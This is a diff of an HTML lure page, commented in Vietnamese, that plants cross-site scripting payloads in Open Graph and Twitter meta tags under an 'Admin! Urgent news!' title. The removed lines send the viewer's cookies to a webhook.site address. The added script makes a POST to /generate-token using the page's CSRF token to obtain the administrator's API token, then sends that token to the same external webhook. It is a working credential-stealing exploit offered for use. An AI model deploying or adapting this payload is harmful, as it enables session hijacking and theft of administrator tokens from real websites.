@@ -5,15 +5,21 @@
     <title>Trang Tải XSS Payload</title>
     <!-- Quan trọng: og:title và og:description chứa XSS payload -->
     <meta property="og:title" content="Admin! Tin Khẩn!">
-    <meta property="og:description" content="<script>new Image().src='https://webhook.site/#!/view/792a817c-a6b3-4529-a9ed-5780c728488a/?cookie='+encodeURIComponent(document.cookie);</script>">
-    
-    <!-- Bạn có thể thêm các thẻ meta khác nếu muốn, ví dụ name="description" -->
-    <meta name="description" content="<script>new Image().src='https://webhook.site/#!/view/792a817c-a6b3-4529-a9ed-5780c728488a/?cookie='+encodeURIComponent(document.cookie);</script>">
-    
-    <!-- Thử cả twitter cards nữa cho chắc -->
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="Admin! Tin Khẩn!">
-    <meta name="twitter:description" content="<script>new Image().src='https://webhook.site/#!/view/792a817c-a6b3-4529-a9ed-5780c728488a/?cookie='+encodeURIComponent(document.cookie);</script>">
+    <meta property="og:description" content="<script>// Kịch bản 1: Lấy API Token của Admin
+          fetch('/generate-token', {
+            method: 'POST',
+            headers: {
+              'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content // Nếu trang có CSRF token
+            }
+          })
+          .then(response => response.json())
+          .then(data => {
+            // Gửi API token của admin về server của bạn
+            new Image().src = 'https://webhook.site/792a817c-a6b3-4529-a9ed-5780c728488a?admin_api_token=' + encodeURIComponent(data.token);
+          })
+          .catch(error => {
+            new Image().src = 'https://webhook.site/792a817c-a6b3-4529-a9ed-5780c728488a?error_generating_token=' + encodeURIComponent(error.message);
+  });</script>">
 </head>
 <body>
     <h1>Nội dung trang này không quan trọng lắm</h1>
